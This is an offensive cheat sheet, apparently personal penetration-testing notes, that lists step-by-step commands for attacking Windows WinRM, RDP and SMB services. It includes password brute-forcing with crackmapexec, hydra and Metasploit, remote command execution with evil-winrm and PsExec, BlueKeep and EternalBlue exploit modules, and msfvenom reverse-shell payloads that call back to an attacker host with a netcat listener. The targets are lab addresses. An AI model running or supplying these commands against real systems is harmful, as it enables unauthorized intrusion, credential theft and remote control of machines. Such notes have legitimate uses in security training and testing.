# Exploiting WinRM

### Nmap Enum
```js
nmap 192.168.2.3 -sV -p5985
```

## Crackmapexec Brute Force
```js
crackmapexec winrm 192.168.2.3 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

## Crackmapexec Exploit
```js
crackmapexec winrm 192.168.2.3 -u administrator -p vagrant -x "whoami"
-x   --> execute command
```

now we want shell on winrm

### evil-winrm.rb
```js
evil-winrm.rb -u administrator -p 'vagrant' -i 192.168.2.3 
```

### MSF Enum
```js
msf6> search type:auxiliary winrm
msf6> use auxiliary/scanner/winrm/winrm_auth_methods

msf6> use auxiliary/scanner/winrm/winrm_login
msf6> set USER_FILE /us/share/metasploit-framework/data/wordlists/common_users.txt
msf6> set PASS_FILE /us/share/metasploit-framework/data/wordlists/unix_passwords.txt

msf6> use auxiliary/scanner/winrm/winrm_cmd
msf6> set USERNAME administrator
msf6> set PASSWORD tinkerbell
msf6> set CMD whoami
```

### Metasploit Exploit
```js
msf6> use exploit/windows/winrm/winrm_script_exec
msf6> set rhosts 192.168.2.3
msf6> set FORCE_VBS true
msf6> USERNAME administrator
msf6> PASSWORD vagrant
msf6> run
```


# CVE-2019-0708 RDP Vulnerability (BlueKeep)

### Nmap Enum
```js
nmap 192.168.2.3 -sV -p3389
```

### Metasploit (BlueKeep)
```js
("check")
msf6> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf6> set rhosts 192.168.2.3
msf6> run

("Exploit")
msf6> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
msf6> set rhosts 192.168.2.3
msf6> show targets
msf6> set target 2  (//depends on the version)
msf6> run
```

# Exploiting RDP

### Nmap Enum RDP
```js
nmap 192.168.2.3 -sV -p-   ("Default RDP 3389")
```

### Verify RDP Existence
```js
msf6> use auxiliary/scanner/rdp/rdp_scanner
msf6> set rhosts 192.168.2.3
msf6> set rport 3333  (//in case of different port)
msf6> run
```

### RDP Brute Force
```js
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.2.3 -s 3333
```

### xFreeRDP   (Login RDP)
```js
xfreerdp /u:administrator /p:vagrant /v:192.168.2.3:3333
```

or u can use Remmina


# MS17-010 SMB Vulnerability (EternalBlue)

## Tools
https://github.com/3ndG4me/AutoBlue-MS17-010

### Nmap check Eternalblue
```js
nmap 192.168.2.3 -sV -O -p445 

nmap 192.168.2.3 -sV -p445 --script=smb-vuln-ms17-010
```

### AutoBlue (Github)
```js
cd AutoBlue-MS17-010
cd shellcode
chmod +x shell_prep.sh
./shell_prep.sh
(//generate msfvenom reverse shell)
//LHOST
//LPORT
//generate regular shell (1)
//generete stageless payload (1)
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.10.10 LPORT=1234

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.10.10 LPORT=1234

nc -lvnp 1234   --> separate terminal

cd ..
chmod +x eternalblue_exploit7.py
python eternalblue_exploit7.py 192.168.2.3 shellcode/sc_x64.bin

DONE! 
```

### Metasploit Exploit EternalBlue
```js
msf6> search eternalblue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set rhosts 192.168.2.3
msf6> exploit
```

# Exploit SMB with PsExec

#### Metasploit SMB Brute force
```bash
msf6> use auxiliary/scanner/smb/smb_login
msf6> set RHOSTS 192.168.2.3
msf6> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords
msf6> set verbose false
msf6> run
```

## PsExec
```js
psexec.py Administrator@192.168.2.3 cmd.exe   (//requires password)
```


### Metasploit PsExec
```bash
msf6> search psexec
msf6> use exploit/windows/smb/psexec
(//check payload and lhost)
msf6> set rhosts 192.168.2.3
msf6> set SMBUser Administrator
msf6> set SMBPass qwertyuiop
msf6> run
```
